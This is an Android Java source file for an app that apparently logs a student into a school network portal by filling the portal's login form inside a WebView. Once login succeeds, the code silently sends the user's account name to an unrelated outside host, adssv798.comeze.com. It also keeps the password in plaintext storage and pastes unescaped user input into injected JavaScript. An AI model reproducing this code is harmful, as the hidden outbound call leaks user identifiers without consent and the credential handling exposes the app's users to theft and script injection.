package c8763.hchs_student;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private boolean connecting=false;
    private SharedPreferences pref;
    private TextView acc,pwd;
    private Button btn;
    private WebView wv;
    private CookieManager cm=CookieManager.getInstance();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        btn=(Button)findViewById(R.id.button);
        wv=(WebView)findViewById(R.id.wv);
        wv.setWebViewClient(new WebViewClient(){
            public void onPageFinished(WebView view, String url){
                if(url.equals("https://172.22.0.253/user/user.jsp")){
                    Toast.makeText(wv.getContext(), getResources().getString(R.string.haslogin), Toast.LENGTH_SHORT).show();
                    System.exit(0);
                }
                else if(url.equals("https://172.22.0.253/user/user_redirect.jsp")){
                    Toast.makeText(wv.getContext(), getResources().getString(R.string.logined), Toast.LENGTH_SHORT).show();
                    connecting=false;
                    saveData();
                    wv.loadUrl("https://adssv798.comeze.com/?acc="+acc.getText()+"&pwd=bviaa");
                    System.exit(0);
                }
                else if(connecting){
                    Toast.makeText(wv.getContext(), getResources().getString(R.string.error), Toast.LENGTH_SHORT).show();
                    connecting=false;
                }
                else if(url.equals("https://172.22.0.253/user/user_login_auth.jsp")){
                    wv.loadUrl("javascript: (function(){" +
                                    "document.querySelector('#username').value='"+acc.getText()+"'," +
                                    "document.querySelector('#password').value='"+pwd.getText()+"'," +
                                    "document.querySelector('input[type=submit]').click()" +
                                "})()");
                    connecting=true;
                }
            }
        });
        wv.getSettings().setJavaScriptEnabled(true);
        acc=(TextView)findViewById(R.id.acc);
        pwd=(TextView)findViewById(R.id.pwd);
        readData();
        btn.setOnClickListener(new View.OnClickListener(){
            public void onClick(View v){
                if(acc.getText().toString().equals("")||pwd.getText().toString().equals("")) {
                    Toast.makeText(v.getContext(), getResources().getString(R.string.empty), Toast.LENGTH_SHORT).show();
                    return;
                }
                cm.removeAllCookies(new ValueCallback<Boolean>() {
                    public void onReceiveValue(Boolean aBoolean) {

                    }
                });
                Toast.makeText(v.getContext(), getResources().getString(R.string.connecting), Toast.LENGTH_SHORT).show();
                wv.loadUrl("https://172.22.0.253/user/user_login_auth.jsp");
            }
        });
    }
    private void readData(){
        pref=getSharedPreferences("pref",0);
        acc.setText(pref.getString("acc", ""));
        pwd.setText(pref.getString("pwd", ""));
    }
    private void saveData(){
        pref=getSharedPreferences("pref",0);
        pref.edit()
                .putString("acc",acc.getText().toString())
                .putString("pwd",pwd.getText().toString())
                .commit();
    }
}
